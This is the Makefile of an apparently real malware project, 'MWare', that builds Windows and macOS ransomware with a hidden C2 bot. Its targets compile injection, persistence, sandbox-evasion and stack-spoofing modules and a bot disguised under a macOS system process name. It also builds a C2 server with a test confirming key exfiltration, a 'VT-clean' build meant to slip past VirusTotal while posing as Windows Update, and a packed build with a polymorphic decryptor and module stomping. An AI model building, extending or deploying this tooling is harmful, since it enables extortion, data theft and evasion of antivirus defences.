# ============================================================================
# Makefile — MWare Modular Build System
# ============================================================================
# Commands:
#   make            — Compile MWare.exe (release)
#   make test       — Build + run the test suite (kex, crypto, e2e handshake)
#   make test-kex   — Key exchange unit tests (RFC vectors)
#   make test-crypto— AEAD + file-layer unit tests
#   make test-e2e   — Full ECDH handshake against a live ./RSW
#   make console    — Compile headless sys_check.exe (sandbox testing)
#   make debug      — Compile with debug symbols
#   make packed     — Run build_v5.py to create packed binary
#   make clean      — Remove all compiled binaries
#   make list       — Show source/header files
#   make cert       — Generate self-signed TLS certificate for RSW
#   make mac        — Build macOS headless C2 bot (MWare-bin)
#   make mac-gui    — Build macOS GUI + its UserEventAgent child
#   make UserEventAgent — Build only the headless child bot
# ============================================================================

CC        = x86_64-w64-mingw32-g++

# wxWidgets for MinGW (Windows GUI) — check availability
WX_MINGW_PREFIX = /usr/local/wx-mingw
WX_MINGW_CONFIG = $(WX_MINGW_PREFIX)/bin/wx-config

ifeq ($(wildcard $(WX_MINGW_CONFIG)),)
    $(error wxWidgets MinGW not found at $(WX_MINGW_CONFIG). Install or compile wxWidgets for MinGW first.)
endif

WX_CXXFLAGS := $(shell $(WX_MINGW_CONFIG) --static --cxxflags 2>/dev/null)
WX_LDFLAGS  := $(shell $(WX_MINGW_CONFIG) --static --libs all 2>/dev/null)

CFLAGS    = -std=c++17 -O2 -s -Wall -Wextra -static -static-libgcc -static-libstdc++ $(WX_CXXFLAGS) -I MWare/
LDFLAGS   = -lws2_32 -lpsapi -lbcrypt -Wl,--strip-all $(WX_LDFLAGS)
RES       = resource.res

# Source files (modular build)
SRCS    = MWare/main.cpp MWare/crypto.cpp MWare/keyexchange.cpp MWare/sandbox_evasion.cpp MWare/evasion.cpp MWare/persistence.cpp MWare/c2_agent.cpp MWare/thread_hijack.cpp MWare/lolbas.cpp MWare/ThreadlessInject.cpp MWare/gui.cpp MWare/stack_spoof.cpp MWare/sleep_obfuscation.cpp
TARGET  = MWare.exe

# ============================================================================
# Default target — MWare.exe (Windows GUI + C2 bot)
# ============================================================================
all: $(TARGET)

$(TARGET): $(SRCS)
	$(CC) $(CFLAGS) $(SRCS) -o $(TARGET) $(LDFLAGS)

# ============================================================================
# macOS native build — headless C2 bot
# ============================================================================
MAC_CC      = clang++
MAC_CFLAGS  = -std=c++17 -O2 -Wall -Wextra -DHEADLESS -DSILENT_MODE -I MWare/
MAC_LDFLAGS = -lpthread
MAC_SRCS    = MWare/main.cpp MWare/crypto.cpp MWare/keyexchange.cpp MWare/sandbox_evasion.cpp MWare/evasion.cpp MWare/persistence.cpp MWare/c2_agent.cpp MWare/thread_hijack.cpp MWare/lolbas.cpp MWare/ThreadlessInject.cpp MWare/gui.cpp MWare/stack_spoof.cpp MWare/sleep_obfuscation.cpp
MAC_TARGET  = MWare-bin

mac: $(MAC_SRCS)
	$(MAC_CC) $(MAC_CFLAGS) $(MAC_SRCS) -o $(MAC_TARGET) $(MAC_LDFLAGS)

# ============================================================================
# macOS GUI build — Ransomware screen + C2 agent in background
# Requires: wxWidgets installed via Homebrew (brew install wxwidgets)
# ============================================================================
MAC_GUI_SRCS = $(MAC_SRCS)
MAC_GUI_TARGET = MWare-gui
MAC_GUI_CFLAGS = -std=c++17 -O2 -Wall -Wextra -DSILENT_MODE -I MWare/

mac-gui: $(C2_CLIENT_TARGET)
	@echo "[*] Checking wxWidgets..."
	@wx-config --cxxflags > /dev/null 2>&1 || (echo "[!] wxWidgets not found! Install: brew install wxwidgets"; exit 1)
	$(MAC_CC) $(MAC_GUI_CFLAGS) $(shell wx-config --cxxflags) \
		$(MAC_GUI_SRCS) -o $(MAC_GUI_TARGET) \
		$(shell wx-config --libs) -framework ApplicationServices $(MAC_LDFLAGS)
	@echo "[+] Built: $(MAC_GUI_TARGET) (GUI mode, silent, raw TCP:8080)"

# ============================================================================
# Headless C2 Client — UserEventAgent (hidden process name)
# Spawned by MWare-gui when correct decryption key is entered.
# Uses raw TCP on port 8080 for C2 traffic (macOS only).
# No TLS — simple, reliable, no cert/key needed.
# ============================================================================
# Binary named like a macOS system process for stealth
C2_CLIENT_TARGET = UserEventAgent
C2_CLIENT_SRCS = MWare/c2_client.cpp MWare/crypto.cpp MWare/keyexchange.cpp MWare/persistence.cpp MWare/c2_agent.cpp \
                 MWare/thread_hijack.cpp MWare/lolbas.cpp MWare/ThreadlessInject.cpp \
                 MWare/stack_spoof.cpp MWare/sleep_obfuscation.cpp MWare/evasion.cpp \
                 MWare/sandbox_evasion.cpp

$(C2_CLIENT_TARGET): $(C2_CLIENT_SRCS)
	$(MAC_CC) $(MAC_CFLAGS) $(C2_CLIENT_SRCS) -o $(C2_CLIENT_TARGET) $(MAC_LDFLAGS)
	@echo "[+] Built: $(C2_CLIENT_TARGET) (headless C2, raw TCP, port 8080)"

# ============================================================================
# RSW — C2 Server with raw TCP on port 8080 (macOS)
# No TLS certificates required — zero-config startup.
# ============================================================================
RSW_TARGET = RSW
RSW_SRC = RSW.cpp rsw_protocol.cpp MWare/crypto.cpp MWare/keyexchange.cpp

$(RSW_TARGET): $(RSW_SRC)
	$(MAC_CC) -std=c++17 -O2 -Wall -Wextra -I MWare/ $(RSW_SRC) -o $(RSW_TARGET) -lpthread
	@echo "[+] Built: $(RSW_TARGET) (C2 server, raw TCP, port 8080)"
	@echo "[!] No TLS — raw TCP on port 8080. No cert needed."

# ============================================================================
# TLS Certificate Generation — self-signed for development/testing
# ============================================================================
cert:
	@echo "[*] Generating self-signed TLS certificate..."
	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem \
		-days 365 -nodes \
		-subj "/CN=RSW-C2/O=WaspHive/OU=Dev/C=US" \
		-addext "subjectAltName=DNS:localhost,IP:127.0.0.1" 2>/dev/null
	@echo "[+] Generated cert.pem + key.pem (valid 365 days)"
	@chmod 600 key.pem

# ============================================================================
# ThreadlessInject — standalone injection tool
# ============================================================================
inject: MWare/ThreadlessInject.cpp
	$(CC) $(CFLAGS) MWare/ThreadlessInject.cpp -o ThreadlessInject.exe

# ============================================================================
# Debug build (with symbols, no stripping)
# ============================================================================
debug: CFLAGS = -std=c++17 -O0 -g -Wall -Wextra -I MWare/
debug: LDFLAGS = -Wl,--strip-all
debug: $(SRCS)
	$(CC) $(CFLAGS) $(SRCS) -o MWare-debug.exe $(LDFLAGS)

# ============================================================================
# Test build — Headless Windows console binary (no GUI/wxWidgets)
# ============================================================================
# Smaller, faster to build, innocent-looking for sandbox testing.
# If this works, the GUI version (MWare.exe) should also work — same core.
TEST_TARGET  = sys_check.exe
TEST_SRCS    = MWare/main.cpp MWare/crypto.cpp MWare/keyexchange.cpp MWare/sandbox_evasion.cpp \
               MWare/evasion.cpp MWare/persistence.cpp MWare/c2_agent.cpp \
               MWare/thread_hijack.cpp MWare/lolbas.cpp MWare/ThreadlessInject.cpp \
               MWare/stack_spoof.cpp MWare/sleep_obfuscation.cpp
TEST_CFLAGS  = -std=c++17 -O2 -s -Wall -Wextra -static -static-libgcc -static-libstdc++ \
               -DHEADLESS -mconsole -I MWare/
TEST_LDFLAGS = -lws2_32 -lpsapi -lbcrypt -Wl,--strip-all

console: $(TEST_SRCS)
	@echo "[*] Building headless console binary (no GUI)..."
	$(CC) $(TEST_CFLAGS) $(TEST_SRCS) -o $(TEST_TARGET) $(TEST_LDFLAGS)
	@echo "[+] Built: $(TEST_TARGET) ($(shell ls -lh $(TEST_TARGET) 2>/dev/null | awk '{print $$5}') console, headless, raw TCP:8080)"
	@echo "[!] No wxWidgets, no GUI — pure console C2 bot for sandbox testing."

# ============================================================================
# Test suite — the real tests live in tests/, these targets wire them up.
# ============================================================================
# Binaries land in build/tests (git-ignored) so the repo root stays clean.
TEST_BIN_DIR = build/tests
TEST_CXX     = clang++
TEST_CXXFLAGS = -std=c++17 -O1 -Wall -Wextra -I MWare/

# Default suite: fast unit tests + the live handshake round-trip.
# Port 8080 must be free — test-e2e binds it.
test: test-kex test-crypto test-e2e
	@echo "[+] All test suites passed"

# Key exchange: SHA-256 / HMAC / HKDF / X25519 / session key / mutual-auth MACs.
test-kex: tests/test_kex.cpp MWare/keyexchange.cpp MWare/crypto.cpp
	@mkdir -p $(TEST_BIN_DIR)
	@echo "[*] test-kex: key exchange (RFC vectors)..."
	$(TEST_CXX) $(TEST_CXXFLAGS) tests/test_kex.cpp MWare/keyexchange.cpp MWare/crypto.cpp \
		-o $(TEST_BIN_DIR)/test_kex
	@$(TEST_BIN_DIR)/test_kex

# Symmetric layer: ChaCha20 / Poly1305 / AEAD failure modes / file encrypt-decrypt.
test-crypto: tests/test_crypto.cpp MWare/crypto.cpp
	@mkdir -p $(TEST_BIN_DIR)
	@echo "[*] test-crypto: AEAD + file layer..."
	$(TEST_CXX) $(TEST_CXXFLAGS) tests/test_crypto.cpp MWare/crypto.cpp \
		-o $(TEST_BIN_DIR)/test_crypto
	@$(TEST_BIN_DIR)/test_crypto

# End-to-end: starts ./RSW on :8080 with a throwaway PSK, runs the bot-side
# handshake (BOT_CONNECT → SESSION_PUB → CLIENT_PUB+confirm → AUTH_OK →
# AEAD KEY_EXFIL), then shuts the server down and verifies what it logged.
test-e2e: RSW tests/test_e2e_handshake.cpp
	@mkdir -p $(TEST_BIN_DIR)
	@echo "[*] test-e2e: handshake against live RSW..."
	$(TEST_CXX) $(TEST_CXXFLAGS) tests/test_e2e_handshake.cpp MWare/keyexchange.cpp \
		MWare/crypto.cpp -o $(TEST_BIN_DIR)/test_e2e_handshake
	@PSK="mware-e2e-$$$$-$$RANDOM"; \
	LOG="$(TEST_BIN_DIR)/rsw_e2e.log"; \
	sleep 120 | RSW_PSK="$$PSK" ./RSW > "$$LOG" 2>&1 & \
	SRV=$$!; \
	i=0; while [ $$i -lt 50 ]; do \
		grep -q "listening on" "$$LOG" 2>/dev/null && break; \
		sleep 0.2; i=$$((i+1)); \
	done; \
	if ! grep -q "listening on" "$$LOG" 2>/dev/null; then \
		echo "[!] RSW failed to start (port 8080 busy?)"; cat "$$LOG"; \
		pkill -P $$SRV 2>/dev/null; kill $$SRV 2>/dev/null; exit 1; \
	fi; \
	$(TEST_BIN_DIR)/test_e2e_handshake "$$PSK"; RC=$$?; \
	sleep 0.5; \
	pkill -P $$SRV 2>/dev/null; kill $$SRV 2>/dev/null; wait $$SRV 2>/dev/null; \
	if ! grep -q "Bot authenticated: E2E_TEST_BOT" "$$LOG"; then \
		echo "[!] server did not log the authenticated bot"; cat "$$LOG"; RC=1; \
	fi; \
	if ! grep -q "KEY_EXFIL" "$$LOG"; then \
		echo "[!] server did not capture the KEY_EXFIL frame"; RC=1; \
	fi; \
	if [ $$RC -eq 0 ]; then echo "ok   server logged auth + key exfil"; \
	else echo "FAIL e2e round-trip"; fi; \
	exit $$RC

# ============================================================================
# VT build — headless, silent, ransomware-hidden (VT_CLEAN)
# ============================================================================
# For VirusTotal uploads:
#   - GUI subsystem (-mwindows): no console window pops in the VT sandbox video
#   - -DSILENT_MODE: zero terminal output (cout/cerr/printf all nulled)
#   - -DVT_CLEAN: no startup target.txt encryption, no /tmp log file drops
#   - -ffunction-sections -fdata-sections + --gc-sections: uncalled
#     ransomware helpers (encryptTargetFile / decryptTargetFile) are removed
#     from the binary entirely. NOTE: gc-sections collects only what is
#     referenced; string literals in LIVE code stay (see OBF() for hiding
#     those) — data-section splitting just lets dead objects be dropped.
#   - resource.res (wuauclt / Windows Update Assistant) masquerade when present
VT_TARGET  = sys_check.exe
VT_SRCS    = $(TEST_SRCS)
VT_CFLAGS  = -std=c++17 -O2 -s -Wall -Wextra -static -static-libgcc -static-libstdc++ \
             -DHEADLESS -DSILENT_MODE -DVT_CLEAN -ffunction-sections -fdata-sections -mwindows -I MWare/
VT_LDFLAGS = -lws2_32 -lpsapi -lbcrypt -Wl,--strip-all -Wl,--gc-sections

vt: $(VT_SRCS)
	@echo "[*] Building VT-clean headless binary (no GUI, silent, ransomware hidden)..."
	$(CC) $(VT_CFLAGS) $(VT_SRCS) $(if $(wildcard resource.res),resource.res) -o $(VT_TARGET) $(VT_LDFLAGS)
	@echo "[+] Built: $(VT_TARGET) ($(shell ls -lh $(VT_TARGET) 2>/dev/null | awk '{print $$5}') GUI-subsystem, headless, silent)"
	@echo "[!] No GUI, no prints, no startup encryption — ready for VT upload."

# ============================================================================
# Packed build (via build_v5.py)
# ============================================================================
packed: $(TARGET)
	python3 build_v5.py

# Packed VT build — headless payload through the same evasion pipeline
# (polymorphic decryptor + Module Stomping + fake imports + encrypted sections)
packed-vt: vt
	python3 build_v5.py sys_check.exe svchost_helper.exe

# ============================================================================
# Quick syntax check (without linking)
# ============================================================================
syntax:
	$(CC) $(CFLAGS) -fsyntax-only $(SRCS)

# ============================================================================
# List all source and header files
# ============================================================================
list:
	@echo "=== MWare Modular Sources ==="
	@for f in $(SRCS); do echo "  $$f ($$(wc -l < $$f) lines)"; done
	@echo ""
	@echo "=== Headers ==="
	@for f in MWare/*.h; do echo "  $$f ($$(wc -l < $$f) lines)"; done
	@echo ""
	@echo "=== macOS Binaries ==="
	@echo "  MWare-gui         (GUI ransomware + C2 agent)"
	@echo "  UserEventAgent    (headless C2 client, raw TCP:8080)"
	@echo "  RSW               (C2 server, raw TCP:8080)"
	@echo ""

# ============================================================================
# Clean
# ============================================================================
clean:
	rm -f *.o *.exe
	rm -f $(TARGET) MWare-debug.exe $(MAC_TARGET) $(MAC_GUI_TARGET) $(RSW_TARGET) $(C2_CLIENT_TARGET) ThreadlessInject.exe $(TEST_TARGET)
	rm -f svchost_helper.exe packed_mware*.exe loader_stub_v5.exe loader_stub_v5.injected.cpp .padding_cache.bin
	rm -f /tmp/legit_padding.bin
	rm -f .padding_cache.bin
	rm -f *_prev_build_macho
	rm -rf $(TEST_BIN_DIR)
	@echo "[+] Clean complete"

# ============================================================================
# Phony targets
# ============================================================================
.PHONY: all gui inject debug packed packed-vt vt syntax list clean mac cert console test test-kex test-crypto test-e2e
